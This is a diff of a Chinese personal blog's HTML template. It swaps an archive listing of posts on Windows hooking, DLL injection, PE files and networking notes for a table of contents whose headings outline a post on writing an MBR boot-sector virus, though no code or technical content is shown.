+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#功能"><span class="toc-number">1.</span> <span class="toc-text">功能</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mbr"><span class="toc-number">2.</span> <span class="toc-text">mbr</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#病毒原理"><span class="toc-number">3.</span> <span class="toc-text">病毒原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#汇编源码"><span class="toc-number">4.</span> <span class="toc-text">汇编源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获得机器码"><span class="toc-number">5.</span> <span class="toc-text">获得机器码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#编写mbr引导区病毒"><span class="toc-number">6.</span> <span class="toc-text">编写mbr引导区病毒</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/windows消息钩取.html" class="archive-article-date">
-  	<time datetime="2019-07-06T14:34:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-06</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/windows消息钩取.html">windows消息钩取</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">windows</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hook</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/DLL注入.html" class="archive-article-date">
-  	<time datetime="2019-07-02T14:09:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/DLL注入.html">DLL注入</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">DLL</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/PE文件.html" class="archive-article-date">
-  	<time datetime="2019-07-01T13:37:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/PE文件.html">PE文件</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">pe文件</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/计算机网络中的安全.html" class="archive-article-date">
-  	<time datetime="2019-06-19T16:49:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/计算机网络中的安全.html">计算机网络中的安全</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/无线网络和移动网络.html" class="archive-article-date">
-  	<time datetime="2019-06-17T16:21:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/无线网络和移动网络.html">无线网络和移动网络</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/链路层和局域网.html" class="archive-article-date">
-  	<time datetime="2019-06-15T16:03:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/链路层和局域网.html">链路层和局域网</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/网络层控制平面.html" class="archive-article-date">
-  	<time datetime="2019-06-14T15:56:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/网络层控制平面.html">网络层控制平面</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/3/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/5/">Next &raquo;</a>
-    </nav>
   
 
 
+
+
+
+
+  
+  
           </div>
         </div>
       </div>
@@ -615,8 +438,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
